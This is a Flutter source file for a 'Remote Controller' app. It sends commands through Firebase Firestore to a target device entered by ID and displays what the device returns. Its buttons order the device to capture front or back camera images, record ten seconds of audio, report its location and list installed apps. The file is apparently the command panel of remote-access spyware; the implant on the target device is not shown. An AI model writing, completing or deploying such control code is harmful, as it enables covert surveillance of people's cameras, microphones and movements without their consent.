
import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:cloud_firestore/cloud_firestore.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  runApp(MaterialApp(
    home: FutureBuilder(
      future: Firebase.initializeApp(),
      builder: (context, snapshot) {
        if (snapshot.hasError) {
          return Scaffold(
            body: Center(
              child: Padding(
                padding: const EdgeInsets.all(24.0),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.error_outline, size: 64, color: Colors.red),
                    SizedBox(height: 16),
                    Text("فشل الاتصال بـ Firebase", textAlign: TextAlign.center,
                        style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold)),
                    SizedBox(height: 12),
                    SelectableText("${snapshot.error}",
                        textAlign: TextAlign.center, style: TextStyle(color: Colors.grey[700], fontSize: 14)),
                    SizedBox(height: 20),
                    ElevatedButton.icon(
                      icon: Icon(Icons.refresh),
                      label: Text("إعادة المحاولة"),
                      onPressed: () {
                        runApp(MyApp());
                      },
                    ),
                  ],
                ),
              ),
            ),
          );
        }
        if (snapshot.connectionState == ConnectionState.done) {
          return ControllerApp();
        }
        return Scaffold(body: Center(child: CircularProgressIndicator(strokeWidth: 3)));
      },
    ),
  ));
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: FutureBuilder(
        future: Firebase.initializeApp(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.done) {
            return ControllerApp();
          }
          return Scaffold(body: Center(child: CircularProgressIndicator()));
        },
      ),
    );
  }
}

class ControllerApp extends StatelessWidget {
  const ControllerApp({super.key});
  @override
  Widget build(BuildContext context) => MaterialApp(home: ControllerScreen());
}

class ControllerScreen extends StatefulWidget {
  @override
  _ControllerScreenState createState() => _ControllerScreenState();
}

class _ControllerScreenState extends State<ControllerScreen> {
  final TextEditingController _idController = TextEditingController();
  String targetId = '';
  String responseText = '';

  void sendCommand(String cmd) {
    if (targetId.isEmpty) return;
    FirebaseFirestore.instance.collection('commands').doc(targetId).set({
      'command': cmd,
      'timestamp': FieldValue.serverTimestamp(),
    });
    FirebaseFirestore.instance.collection('responses').doc(targetId).snapshots().listen((doc) {
      if (doc.exists) {
        setState(() {
          responseText = doc.data()?.toString() ?? '';
        });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('Remote Controller')),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: ListView(
          children: [
            TextField(
              controller: _idController,
              decoration: InputDecoration(labelText: 'Target Device ID'),
              onChanged: (v) => targetId = v.trim(),
            ),
            SizedBox(height: 20),
            ElevatedButton.icon(
              icon: Icon(Icons.apps),
              label: Text('Get Installed Apps'),
              onPressed: () => sendCommand('get_apps'),
            ),
            ElevatedButton.icon(
              icon: Icon(Icons.camera_front),
              label: Text('Capture Front Camera'),
              onPressed: () => sendCommand('camera_front'),
            ),
            ElevatedButton.icon(
              icon: Icon(Icons.camera_rear),
              label: Text('Capture Back Camera'),
              onPressed: () => sendCommand('camera_back'),
            ),
            ElevatedButton.icon(
              icon: Icon(Icons.mic),
              label: Text('Record Audio (10s)'),
              onPressed: () => sendCommand('record_audio'),
            ),
            ElevatedButton.icon(
              icon: Icon(Icons.location_on),
              label: Text('Get Location'),
              onPressed: () => sendCommand('location'),
            ),
            SizedBox(height: 30),
            Text('Response:', style: TextStyle(fontWeight: FontWeight.bold)),
            SelectableText(responseText.isEmpty ? 'No response yet' : responseText),
          ],
        ),
      ),
    );
  }
}
